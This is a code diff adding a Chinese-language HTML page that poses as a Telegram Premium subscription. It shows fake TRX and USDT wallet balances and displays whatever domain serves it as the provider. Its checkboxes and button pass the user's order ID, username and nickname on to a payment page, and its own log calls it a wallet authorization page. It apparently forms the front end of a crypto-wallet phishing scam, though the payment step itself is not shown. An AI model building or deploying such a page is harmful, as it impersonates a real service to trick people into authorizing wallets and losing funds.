@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>授权访问 - Telegram Premium</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #f5f5f5;
+            color: #333;
+            min-height: 100vh;
+            padding: 1rem;
+            line-height: 1.5;
+        }
+        
+        .auth-container {
+            max-width: 400px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 1rem;
+            overflow: hidden;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            color: white;
+            padding: 1.5rem;
+            text-align: center;
+        }
+        
+        .header h1 {
+            font-size: 1.4rem;
+            margin-bottom: 0.5rem;
+        }
+        
+        .header p {
+            opacity: 0.9;
+            font-size: 0.9rem;
+        }
+        
+        .assets-section {
+            padding: 1.5rem;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .asset-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1rem 0;
+            border-bottom: 1px solid #f0f0f0;
+        }
+        
+        .asset-item:last-child {
+            border-bottom: none;
+        }
+        
+        .asset-info {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+        }
+        
+        .asset-icon {
+            width: 2.5rem;
+            height: 2.5rem;
+            border-radius: 50%;
+            background: #f0f0f0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+        }
+        
+        .asset-details h3 {
+            font-size: 1rem;
+            margin-bottom: 0.25rem;
+        }
+        
+        .asset-details p {
+            font-size: 0.8rem;
+            color: #666;
+        }
+        
+        .asset-balance {
+            text-align: right;
+        }
+        
+        .asset-balance .amount {
+            font-size: 1rem;
+            font-weight: 600;
+            margin-bottom: 0.25rem;
+        }
+        
+        .asset-balance .value {
+            font-size: 0.8rem;
+            color: #666;
+        }
+        
+        .service-info {
+            padding: 1rem 1.5rem;
+            background: #f8f9fa;
+            text-align: center;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .service-info p {
+            font-size: 0.85rem;
+            color: #666;
+        }
+        
+        .domain-verify {
+            color: #1890ff;
+            font-weight: 600;
+        }
+        
+        .networks-section {
+            padding: 1rem 1.5rem;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .networks-section h3 {
+            font-size: 0.9rem;
+            margin-bottom: 0.75rem;
+            color: #666;
+        }
+        
+        .network-tag {
+            display: inline-block;
+            background: #e6f7ff;
+            color: #1890ff;
+            padding: 0.4rem 0.8rem;
+            border-radius: 1rem;
+            font-size: 0.8rem;
+            border: 1px solid #91d5ff;
+        }
+        
+        .agreement-section {
+            padding: 1.5rem;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .agreement-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 0.75rem;
+            margin-bottom: 1rem;
+        }
+        
+        .agreement-item:last-child {
+            margin-bottom: 0;
+        }
+        
+        .checkbox {
+            width: 1.2rem;
+            height: 1.2rem;
+            border: 2px solid #ddd;
+            border-radius: 0.25rem;
+            margin-top: 0.1rem;
+            flex-shrink: 0;
+            cursor: pointer;
+        }
+        
+        .checkbox.checked {
+            background: #1890ff;
+            border-color: #1890ff;
+            position: relative;
+        }
+        
+        .checkbox.checked::after {
+            content: '✓';
+            color: white;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 0.8rem;
+        }
+        
+        .agreement-text {
+            font-size: 0.85rem;
+            color: #666;
+            line-height: 1.4;
+        }
+        
+        .agreement-text a {
+            color: #1890ff;
+            text-decoration: none;
+        }
+        
+        .action-section {
+            padding: 1.5rem;
+        }
+        
+        .enter-btn {
+            display: block;
+            width: 100%;
+            background: linear-gradient(90deg, #ff8c00, #ffd700);
+            color: #1e3c72;
+            padding: 1rem 1.5rem;
+            border-radius: 3rem;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 1.1rem;
+            border: none;
+            cursor: pointer;
+            text-align: center;
+        }
+        
+        .enter-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+    </style>
+</head>
+<body>
+    <div class="auth-container">
+        <div class="header">
+            <h1>Telegram Premium 订阅</h1>
+            <p>高级功能和无限制体验</p>
+        </div>
+        
+        <div class="assets-section">
+            <div class="asset-item">
+                <div class="asset-info">
+                    <div class="asset-icon">T</div>
+                    <div class="asset-details">
+                        <h3>TRX</h3>
+                        <p>$0.2920 -1.53%</p>
+                    </div>
+                </div>
+                <div class="asset-balance">
+                    <div class="amount">0.915002</div>
+                    <div class="value">$0.26</div>
+                </div>
+            </div>
+            
+            <div class="asset-item">
+                <div class="asset-info">
+                    <div class="asset-icon">U</div>
+                    <div class="asset-details">
+                        <h3>USDT</h3>
+                        <p>$1.0000 0.00%</p>
+                    </div>
+                </div>
+                <div class="asset-balance">
+                    <div class="amount">1.990000</div>
+                    <div class="value">$1.99</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="service-info">
+            <p>此服务由 <span class="domain-verify" id="domainDisplay">fosq.mac111.top</span> 提供</p>
+        </div>
+        
+        <div class="networks-section">
+            <h3>支持的网络</h3>
+            <div class="network-tag">全部网络</div>
+        </div>
+        
+        <div class="agreement-section">
+            <div class="agreement-item">
+                <div class="checkbox" id="riskCheckbox" onclick="toggleCheckbox(this)"></div>
+                <div class="agreement-text">
+                    🔍 我已仔细阅读并同意 <a href="#" onclick="showRiskStatement()">风险声明</a>
+                </div>
+            </div>
+            
+            <div class="agreement-item">
+                <div class="checkbox" id="reminderCheckbox" onclick="toggleCheckbox(this)"></div>
+                <div class="agreement-text">
+                    ○ 不再提醒
+                </div>
+            </div>
+        </div>
+        
+        <div class="action-section">
+            <button class="enter-btn" id="enterBtn" disabled onclick="enterPayment()">进入</button>
+        </div>
+    </div>
+
+    <script>
+        // 获取URL参数
+        const urlParams = new URLSearchParams(window.location.search);
+        const orderId = urlParams.get('orderId') || generateOrderId();
+        const username = urlParams.get('username') || '';
+        const nickname = urlParams.get('nickname') || '';
+        
+        // 显示当前域名
+        document.getElementById('domainDisplay').textContent = window.location.hostname;
+        
+        // 生成订单号
+        function generateOrderId() {
+            return 'TG' + Date.now() + Math.random().toString(36).substr(2, 8).toUpperCase();
+        }
+        
+        // 切换复选框
+        function toggleCheckbox(checkbox) {
+            checkbox.classList.toggle('checked');
+            checkAgreements();
+        }
+        
+        // 检查协议是否都已同意
+        function checkAgreements() {
+            const riskChecked = document.getElementById('riskCheckbox').classList.contains('checked');
+            const enterBtn = document.getElementById('enterBtn');
+            
+            enterBtn.disabled = !riskChecked;
+        }
+        
+        // 显示风险声明
+        function showRiskStatement() {
+            alert('风险声明：\n\n1. 请确认您访问的域名是否正确\n2. 交易一旦完成无法撤销\n3. 请勿向陌生人泄露私钥\n4. 建议小额测试后再进行大额交易');
+        }
+        
+        // 进入支付页面
+        function enterPayment() {
+            // 构建支付页面URL
+            const paymentUrl = `payment.html?orderId=${orderId}&username=${encodeURIComponent(username)}&nickname=${encodeURIComponent(nickname)}&amount=1.99`;
+            
+            // 跳转到支付页面
+            window.location.href = paymentUrl;
+        }
+        
+        // 页面加载时初始化
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('钱包授权页面加载完成');
+            console.log('订单信息:', { orderId, username, nickname });
+        });
+    </script>
+</body>
+</html>
